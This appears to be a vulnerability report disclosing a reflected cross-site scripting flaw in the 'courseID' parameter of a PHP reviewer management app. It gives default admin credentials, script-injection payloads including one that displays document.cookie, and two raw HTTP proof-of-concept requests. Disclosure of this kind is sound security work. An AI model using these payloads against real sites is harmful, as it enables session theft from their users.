# Online Reviewer Management System v1.0 by janobe has Cross-site scripting (reflected)

BUG_Author: crazychen123

Accessing admin accounts: Username: admin / Password: admin

Vulnerability File: reviewer_0/admins/assessments/course/course-update.php

Parameter "courseID" (GET), exists XSS vulnerability

Payload1:courseID=1"><script>alert(1111)</script>

#POC：
```
GET /reviewer_0/admins/assessments/course/course-update.php?courseID=1%22%3E%3Cscript%3Ealert(1111)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=8004tqeh90ds1l3vr4t60bq179
Connection: close
```

![image](https://github.com/hundanchen69/pic/blob/main/111.png)

Payload2:courseID=1"><script>alert(document.cookie)</script>

#POC：
```
GET /reviewer_0/admins/assessments/course/course-update.php?courseID=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=8004tqeh90ds1l3vr4t60bq179
Connection: close
```

![image](https://github.com/hundanchen69/pic/blob/main/cookie.png)
